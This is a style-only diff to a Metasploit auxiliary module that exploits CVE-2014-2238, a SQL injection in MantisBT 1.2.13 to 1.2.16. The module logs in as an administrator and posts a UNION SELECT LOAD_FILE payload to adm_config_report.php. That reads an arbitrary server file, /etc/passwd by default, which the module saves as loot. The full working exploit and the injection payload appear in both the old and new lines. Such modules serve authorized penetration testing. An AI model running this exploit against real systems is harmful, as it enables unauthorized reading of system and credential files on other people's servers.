@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 ## Current source: https://github.com/rapid7/metasploit-framework
@@ -6,41 +7,40 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => "MantisBT Admin SQL Injection Arbitrary File Read",
-      'Description'    => %q{
-      Versions 1.2.13 through 1.2.16 are vulnerable to a SQL injection attack if
-      an attacker can gain access to administrative credentials.
+                      'Name'           => "MantisBT Admin SQL Injection Arbitrary File Read",
+                      'Description'    => %q(
+                      Versions 1.2.13 through 1.2.16 are vulnerable to a SQL injection attack if
+                      an attacker can gain access to administrative credentials.
 
-      This vuln was fixed in 1.2.17.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Jakub Galczyk', #initial discovery
-          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
-        ],
-      'References'     =>
-        [
-          ['CVE', '2014-2238'],
-          ['URL', 'http://www.mantisbt.org/bugs/view.php?id=17055']
-        ],
-      'Platform'       => ['win', 'linux'],
-      'Privileged'     => false,
-      'DisclosureDate' => "Feb 28 2014"))
+                      This vuln was fixed in 1.2.17.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Jakub Galczyk', # initial discovery
+                          'Brandon Perry <bperry.volatile[at]gmail.com>' # meatpistol module
+                        ],
+                      'References'     =>
+                        [
+                          ['CVE', '2014-2238'],
+                          ['URL', 'http://www.mantisbt.org/bugs/view.php?id=17055']
+                        ],
+                      'Platform'       => ['win', 'linux'],
+                      'Privileged'     => false,
+                      'DisclosureDate' => "Feb 28 2014"))
 
-      register_options(
+    register_options(
       [
         OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd']),
         OptString.new('USERNAME', [ true, 'Single username', 'administrator']),
         OptString.new('PASSWORD', [ true, 'Single password', 'root']),
         OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])
-      ], self.class)
-
+      ], self.class
+    )
   end
 
   def run
@@ -51,21 +51,17 @@ class MetasploitModule < Msf::Auxiliary
       'secure_session' => 'on'
     }
 
-    resp = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, '/login.php'),
-      'method' => 'POST',
-      'vars_post' => post
-    })
+    resp = send_request_cgi('uri' => normalize_uri(target_uri.path, '/login.php'),
+                            'method' => 'POST',
+                            'vars_post' => post)
 
-    if !resp or !resp.body
+    if !resp || !resp.body
       fail_with(Failure::UnexpectedReply, "Error in server response. Ensure the server IP is correct.")
     end
 
     cookie = resp.get_cookies
 
-    if cookie == ''
-      fail_with(Failure::NoAccess, "Authentication failed")
-    end
+    fail_with(Failure::NoAccess, "Authentication failed") if cookie == ''
 
     filepath = datastore['FILEPATH'].unpack("H*")[0]
 
@@ -73,14 +69,12 @@ class MetasploitModule < Msf::Auxiliary
     payload << "+UNION+ALL+SELECT+11%2C11%2C11%2C11%2CCONCAT%280x71676a7571%2CIFNULL%28CAST%28HEX%28LOAD_FILE"
     payload << "%280x#{filepath}%29%29+AS+CHAR%29%2C0x20%29%2C0x7169727071%29%2C11%23&apply_filter_button=Apply+Filter"
 
-    resp = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, '/adm_config_report.php'),
-      'method' => 'POST',
-      'data' => payload,
-      'cookie' => cookie,
-    })
+    resp = send_request_cgi('uri' => normalize_uri(target_uri.path, '/adm_config_report.php'),
+                            'method' => 'POST',
+                            'data' => payload,
+                            'cookie' => cookie)
 
-    if !resp or !resp.body
+    if !resp || !resp.body
       fail_with(Failure::UnexpectedReply, "Error in server response")
     end
 
@@ -95,9 +89,6 @@ class MetasploitModule < Msf::Auxiliary
 
     path = store_loot("mantisbt.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])
 
-    if path and path != ''
-      print_good("File saved to: #{path}")
-    end
+    print_good("File saved to: #{path}") if path && (path != '')
   end
-
 end
